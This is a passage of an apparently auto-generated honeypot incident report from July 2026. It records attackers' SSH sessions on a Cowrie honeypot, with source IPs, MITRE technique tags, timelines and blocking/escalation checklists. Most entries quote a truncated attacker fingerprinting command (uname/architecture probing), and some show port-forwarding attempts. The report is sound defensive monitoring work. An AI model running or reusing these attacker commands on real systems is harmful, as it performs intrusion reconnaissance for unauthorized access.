| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.success` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:27` | `cowrie.command.input` |
| `2026-07-06 14:28:30` | `cowrie.log.closed` |
| `2026-07-06 14:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-438a06d50939

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:29 |
| **Last Seen** | 2026-07-06 14:30 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:29:39` | `cowrie.session.connect` |
| `2026-07-06 14:29:44` | `cowrie.client.version` |
| `2026-07-06 14:29:44` | `cowrie.client.kex` |
| `2026-07-06 14:30:07` | `cowrie.login.success` |
| `2026-07-06 14:30:17` | `cowrie.session.params` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.success` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:17` | `cowrie.command.input` |
| `2026-07-06 14:30:21` | `cowrie.log.closed` |
| `2026-07-06 14:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c726b2f16a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 14:30 |
| **Last Seen** | 2026-07-06 14:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:30:43` | `cowrie.session.connect` |
| `2026-07-06 14:30:43` | `cowrie.client.version` |
| `2026-07-06 14:30:43` | `cowrie.client.kex` |
| `2026-07-06 14:30:44` | `cowrie.login.success` |
| `2026-07-06 14:30:44` | `cowrie.direct-tcpip.request` |
| `2026-07-06 14:30:44` | `cowrie.direct-tcpip.data` |
| `2026-07-06 14:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6df98e11b899

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:31 |
| **Last Seen** | 2026-07-06 14:32 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:31:59` | `cowrie.session.connect` |
| `2026-07-06 14:32:04` | `cowrie.client.version` |
| `2026-07-06 14:32:04` | `cowrie.client.kex` |
| `2026-07-06 14:32:30` | `cowrie.login.success` |
| `2026-07-06 14:32:42` | `cowrie.session.params` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.success` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:42` | `cowrie.command.input` |
| `2026-07-06 14:32:47` | `cowrie.log.closed` |
| `2026-07-06 14:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728120b63005

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:33 |
| **Last Seen** | 2026-07-06 14:34 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:33:55` | `cowrie.session.connect` |
| `2026-07-06 14:34:01` | `cowrie.client.version` |
| `2026-07-06 14:34:01` | `cowrie.client.kex` |
| `2026-07-06 14:34:28` | `cowrie.login.success` |
| `2026-07-06 14:34:38` | `cowrie.session.params` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.success` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:38` | `cowrie.command.input` |
| `2026-07-06 14:34:40` | `cowrie.log.closed` |
| `2026-07-06 14:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d079c0dce2d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:35 |
| **Last Seen** | 2026-07-06 14:36 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:35:40` | `cowrie.session.connect` |
| `2026-07-06 14:35:44` | `cowrie.client.version` |
| `2026-07-06 14:35:44` | `cowrie.client.kex` |
| `2026-07-06 14:36:10` | `cowrie.login.success` |
| `2026-07-06 14:36:21` | `cowrie.session.params` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.success` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:21` | `cowrie.command.input` |
| `2026-07-06 14:36:25` | `cowrie.log.closed` |
| `2026-07-06 14:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab6c04570db6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 14:36 |
| **Last Seen** | 2026-07-06 14:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:36:58` | `cowrie.session.connect` |
| `2026-07-06 14:37:00` | `cowrie.client.version` |
| `2026-07-06 14:37:00` | `cowrie.client.kex` |
| `2026-07-06 14:37:06` | `cowrie.login.success` |
| `2026-07-06 14:37:10` | `cowrie.session.params` |
| `2026-07-06 14:37:10` | `cowrie.command.input` |
| `2026-07-06 14:37:11` | `cowrie.log.closed` |
| `2026-07-06 14:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a4900e77927

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:37 |
| **Last Seen** | 2026-07-06 14:38 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:37:25` | `cowrie.session.connect` |
| `2026-07-06 14:37:28` | `cowrie.client.version` |
| `2026-07-06 14:37:28` | `cowrie.client.kex` |
| `2026-07-06 14:37:50` | `cowrie.login.success` |
| `2026-07-06 14:38:01` | `cowrie.session.params` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.success` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:01` | `cowrie.command.input` |
| `2026-07-06 14:38:05` | `cowrie.log.closed` |
| `2026-07-06 14:38:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05bd6db54ade

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 14:37 |
| **Last Seen** | 2026-07-06 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:37:30` | `cowrie.session.connect` |
| `2026-07-06 14:37:30` | `cowrie.client.version` |
| `2026-07-06 14:37:30` | `cowrie.client.kex` |
| `2026-07-06 14:37:30` | `cowrie.login.success` |
| `2026-07-06 14:37:31` | `cowrie.session.params` |
| `2026-07-06 14:37:31` | `cowrie.command.input` |
| `2026-07-06 14:37:31` | `cowrie.log.closed` |
| `2026-07-06 14:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a582eb1b5cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:39 |
| **Last Seen** | 2026-07-06 14:39 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:39:06` | `cowrie.session.connect` |
| `2026-07-06 14:39:11` | `cowrie.client.version` |
| `2026-07-06 14:39:11` | `cowrie.client.kex` |
| `2026-07-06 14:39:34` | `cowrie.login.success` |
| `2026-07-06 14:39:46` | `cowrie.session.params` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.success` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:46` | `cowrie.command.input` |
| `2026-07-06 14:39:48` | `cowrie.log.closed` |
| `2026-07-06 14:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-309647bdb41b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:40 |
| **Last Seen** | 2026-07-06 14:41 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:40:42` | `cowrie.session.connect` |
| `2026-07-06 14:40:48` | `cowrie.client.version` |
| `2026-07-06 14:40:48` | `cowrie.client.kex` |
| `2026-07-06 14:41:13` | `cowrie.login.success` |
| `2026-07-06 14:41:25` | `cowrie.session.params` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.success` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:25` | `cowrie.command.input` |
| `2026-07-06 14:41:27` | `cowrie.log.closed` |
| `2026-07-06 14:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec82f2f9e52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:42 |
| **Last Seen** | 2026-07-06 14:43 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:42:30` | `cowrie.session.connect` |
| `2026-07-06 14:42:36` | `cowrie.client.version` |
| `2026-07-06 14:42:36` | `cowrie.client.kex` |
| `2026-07-06 14:42:59` | `cowrie.login.success` |
| `2026-07-06 14:43:08` | `cowrie.session.params` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.success` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:08` | `cowrie.command.input` |
| `2026-07-06 14:43:09` | `cowrie.log.closed` |
| `2026-07-06 14:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc8a5f39a59

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 14:43 |
| **Last Seen** | 2026-07-06 14:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:43:03` | `cowrie.session.connect` |
| `2026-07-06 14:43:03` | `cowrie.client.version` |
| `2026-07-06 14:43:03` | `cowrie.client.kex` |
| `2026-07-06 14:43:03` | `cowrie.login.success` |
| `2026-07-06 14:43:03` | `cowrie.direct-tcpip.request` |
| `2026-07-06 14:43:03` | `cowrie.direct-tcpip.data` |
| `2026-07-06 14:43:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d6c0c91c4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:44 |
| **Last Seen** | 2026-07-06 14:44 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:44:09` | `cowrie.session.connect` |
| `2026-07-06 14:44:15` | `cowrie.client.version` |
| `2026-07-06 14:44:15` | `cowrie.client.kex` |
| `2026-07-06 14:44:41` | `cowrie.login.success` |
| `2026-07-06 14:44:50` | `cowrie.session.params` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.success` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:50` | `cowrie.command.input` |
| `2026-07-06 14:44:51` | `cowrie.log.closed` |
| `2026-07-06 14:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6631ebc522fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:45 |
| **Last Seen** | 2026-07-06 14:46 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:45:45` | `cowrie.session.connect` |
| `2026-07-06 14:45:49` | `cowrie.client.version` |
| `2026-07-06 14:45:49` | `cowrie.client.kex` |
| `2026-07-06 14:46:14` | `cowrie.login.success` |
| `2026-07-06 14:46:26` | `cowrie.session.params` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
| `2026-07-06 14:46:26` | `cowrie.command.success` |
| `2026-07-06 14:46:26` | `cowrie.command.input` |
